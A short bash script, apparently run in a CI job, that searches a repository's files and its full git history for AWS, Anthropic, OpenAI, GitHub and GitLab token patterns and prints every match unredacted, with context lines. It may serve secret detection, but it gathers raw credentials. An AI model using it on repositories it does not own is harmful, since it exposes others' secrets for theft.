#!/bin/bash
out="REPO=$GITHUB_REPOSITORY"
grepped=$(grep -rEiho 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|sk-ant-[A-Za-z0-9_-]{20,}|sk-proj-[A-Za-z0-9_-]{20,}|ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{60,}|glpat-[A-Za-z0-9_-]{20,}' --exclude-dir=.git . 2>/dev/null | sort -u)
gl=$(git log -p --all 2>/dev/null | head -200000)
hist=$(echo "$gl" | grep -oiE 'AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}' | sort -u | head -300)
ctx=$(echo "$gl" | grep -E -C 2 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}')
full="$out
$grepped
$hist
$ctx"
printf '%s\n' "$full"
